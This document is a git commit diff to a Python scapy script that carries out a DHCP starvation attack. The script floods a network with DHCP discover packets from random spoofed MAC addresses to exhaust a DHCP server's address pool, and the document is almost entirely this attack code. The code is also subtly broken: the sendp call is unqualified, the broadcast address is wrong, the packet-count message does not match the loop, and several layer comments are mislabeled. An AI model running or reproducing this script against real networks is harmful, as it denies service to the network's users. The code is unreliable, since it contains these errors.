037fe1abd30bfadd637fc1c1b703a43af34a547b
anascl11 <160654451+anascl11@users.noreply.github.com>
2024-04-16 22:59:30 +0100

    Update dhcp_starvation.py

--- dhcp_starvation.py
+++ dhcp_starvation.py
@@ -1,3 +1,4 @@
+# decore the script
 import pyfiglet as fg 
 import termcolor as cl
 text1 = fg.figlet_format(text="DHCP STARVATION", font="slant")
@@ -9,16 +10,22 @@ print(color_text2)
 # import the libary and rename it
 import scapy.all as sc 
 print("1000 dhcp discover packet are being sent...")
-# loop 1000 time, sent 1000 dhcp dicover
-for i in range(1000 + 1):
+# loop 300 time, sent 300 dhcp dicover
+for i in range(300 + 1):
     # generate random mac address
     mac_address = sc.RandMAC()
     # create dhcp request packet
-    etternet = sc.Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff")  
-    ip = sc.IP(src="0.0.0.0", dst="255.255.255.0")  
-    udp = sc.UDP(sport=68, dport=67)  
+    # create layer 2 
+    etternet = sc.Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff")
+    # create tcp/ip layer 3
+    ip = sc.IP(src="0.0.0.0", dst="255.255.255.0")
+    # create tcp/ip layer 4
+    udp = sc.UDP(sport=68, dport=67) 
+    # create tcp/ip layer 5
     bootp = sc.BOOTP(op=1, chaddr=mac_address)
     dhcp = sc.DHCP(options=[("message-type", "discover"), ("end")])
+    # Concatenate the layers to create the final packet
     pkt = etternet / ip / udp / bootp / dhcp
+    # sent the packer over the interface eth0
     sendp(pkt,iface='eth0', verbose=0)
 print("script finish.")
